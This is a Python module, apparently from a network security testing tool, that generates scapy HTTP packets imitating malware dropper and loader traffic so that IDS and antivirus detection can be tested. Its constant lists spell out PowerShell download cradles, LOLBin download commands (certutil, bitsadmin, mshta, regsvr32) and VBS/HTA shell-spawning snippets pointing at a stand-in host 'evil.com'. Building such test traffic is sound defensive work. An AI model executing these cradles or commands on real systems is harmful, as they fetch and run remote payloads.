"""Dropper and loader detection traffic module."""

import base64
import random
from collections.abc import Iterator

from scapy.layers.inet import IP, TCP
from scapy.packet import Packet, Raw

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule

# PowerShell download cradle patterns
POWERSHELL_CRADLES = [
    "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
    "IEX (iwr 'http://evil.com/stage2.ps1')",
    "powershell -enc JABjAGwAaQBlAG4AdAA=",  # Base64 encoded
    "powershell -nop -w hidden -c IEX((new-object net.webclient).downloadstring('http://evil.com'))",
    "IEX(([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('base64here'))))",
    "powershell -exec bypass -c (New-Object Net.WebClient).DownloadFile('http://evil.com/mal.exe','C:\\temp\\mal.exe')",
]

# LOLBins (Living off the Land Binaries)
LOLBIN_PATTERNS = [
    "certutil -urlcache -split -f http://evil.com/payload.exe payload.exe",
    "bitsadmin /transfer myJob /download http://evil.com/mal.exe C:\\temp\\mal.exe",
    "mshta http://evil.com/payload.hta",
    "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll",
    'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write();',
    "cmstp /ni /s http://evil.com/mal.inf",
    'wmic process call create "cmd /c http://evil.com/payload"',
    'forfiles /p c:\\windows\\system32 /m notepad.exe /c "cmd /c calc.exe"',
]

# VBS/HTA dropper patterns
VBS_HTA_PATTERNS = [
    '<script language="VBScript">CreateObject("WScript.Shell").Run "cmd /c calc"</script>',
    '<HTA:APPLICATION ID="app" APPLICATIONNAME="test"><script>new ActiveXObject("WScript.Shell").Run("calc")</script></HTA:APPLICATION>',
    'Set shell = CreateObject("WScript.Shell") : shell.Run "powershell -enc base64"',
]

# Macro patterns
MACRO_INDICATORS = [
    "Auto_Open",
    "Document_Open",
    "Workbook_Open",
    "Shell(",
    "WScript.Shell",
    "CreateObject",
    "PowerShell",
    "cmd.exe",
]


class DropperModule(TrafficModule):
    """Traffic module for dropper and loader detection patterns.

    Generates HTTP traffic that simulates malware dropper behavior
    including PowerShell cradles, LOLBins, and macro downloads.
    """

    def __init__(self) -> None:
        """Initialize the dropper module."""
        self._dropper_count = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="dropper",
            description="Dropper/loader detection (PowerShell, LOLBins, macros, HTA)",
            category=TrafficCategory.ANTIVIRUS,
            protocols=["TCP"],
            ports=[80, 443, 8080],
        )

    def _generate_powershell_cradle(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate PowerShell download cradle pattern."""
        cradle = random.choice(POWERSHELL_CRADLES)

        # URL-encoded cradle in GET parameter
        import urllib.parse

        encoded_cradle = urllib.parse.quote(cradle)

        http_request = (
            f"GET /update.ps1?cmd={encoded_cradle[:50]} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            f"Accept: */*\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_lolbin_download(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate LOLBin download pattern."""
        # Request that would be made by a LOLBin
        lolbin_paths = [
            "/payload.exe",
            "/stage2.dll",
            "/mal.sct",
            "/update.inf",
            "/config.xml",
        ]

        path = random.choice(lolbin_paths)

        # User-agent patterns from LOLBins
        lolbin_agents = [
            "Microsoft-CryptoAPI/10.0",  # certutil
            "Microsoft BITS/7.8",  # bitsadmin
            "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",  # mshta
        ]

        agent = random.choice(lolbin_agents)

        http_request = (
            f"GET {path} HTTP/1.1\r\nHost: {dst_ip}\r\nUser-Agent: {agent}\r\nAccept: */*\r\n\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_hta_payload(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate HTA file request."""
        http_request = (
            f"GET /update.hta HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0)\r\n"
            f"Accept: application/hta\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_vbs_download(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate VBScript download pattern."""
        http_request = (
            f"GET /script.vbs HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0)\r\n"
            f"Accept: text/vbscript\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_macro_doc_download(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate malicious document download pattern."""
        doc_names = [
            "invoice.doc",
            "resume.docm",
            "order.xlsm",
            "report.doc",
            "document.dotm",
        ]

        doc = random.choice(doc_names)

        http_request = (
            f"GET /{doc} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            f"Accept: application/msword,application/vnd.ms-excel\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_encoded_payload(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate base64 encoded payload request/response pattern."""
        # Simulated encoded payload in response body would look like this
        fake_ps = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com')"
        encoded = base64.b64encode(fake_ps.encode()).decode()

        # Request for encoded content
        http_request = (
            f"GET /config.txt HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"X-Encoded-Payload: {encoded[:50]}\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_dll_sideload(self, src_ip: str, dst_ip: str, port: int) -> Iterator[Packet]:
        """Generate DLL sideloading download pattern."""
        # Common DLL sideloading targets
        dll_names = [
            "version.dll",
            "wbemcomn.dll",
            "dbghelp.dll",
            "mfc40.dll",
            "mfc42.dll",
        ]

        dll = random.choice(dll_names)

        http_request = (
            f"GET /update/{dll} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            f"Accept: application/x-msdownload\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def _generate_office_template_injection(
        self, src_ip: str, dst_ip: str, port: int
    ) -> Iterator[Packet]:
        """Generate Office template injection pattern."""
        # Remote template URL request
        template_paths = [
            "/templates/default.dotm",
            "/office/template.doc",
            "/doc/macro.dotx",
        ]

        path = random.choice(template_paths)

        http_request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Microsoft Office/16.0\r\n"
            f"Accept: application/vnd.openxmlformats-officedocument\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )
        yield packet

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate dropper/loader detection packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address
            dst_port: Destination port

        Yields:
            Scapy packets with dropper/loader patterns
        """
        port = dst_port or 80
        self._dropper_count += 1

        # Rotate through different dropper types
        dropper_type = self._dropper_count % 8

        if dropper_type == 0:
            yield from self._generate_powershell_cradle(src_ip, dst_ip, port)
        elif dropper_type == 1:
            yield from self._generate_lolbin_download(src_ip, dst_ip, port)
        elif dropper_type == 2:
            yield from self._generate_hta_payload(src_ip, dst_ip, port)
        elif dropper_type == 3:
            yield from self._generate_vbs_download(src_ip, dst_ip, port)
        elif dropper_type == 4:
            yield from self._generate_macro_doc_download(src_ip, dst_ip, port)
        elif dropper_type == 5:
            yield from self._generate_encoded_payload(src_ip, dst_ip, port)
        elif dropper_type == 6:
            yield from self._generate_dll_sideload(src_ip, dst_ip, port)
        else:
            yield from self._generate_office_template_injection(src_ip, dst_ip, port)
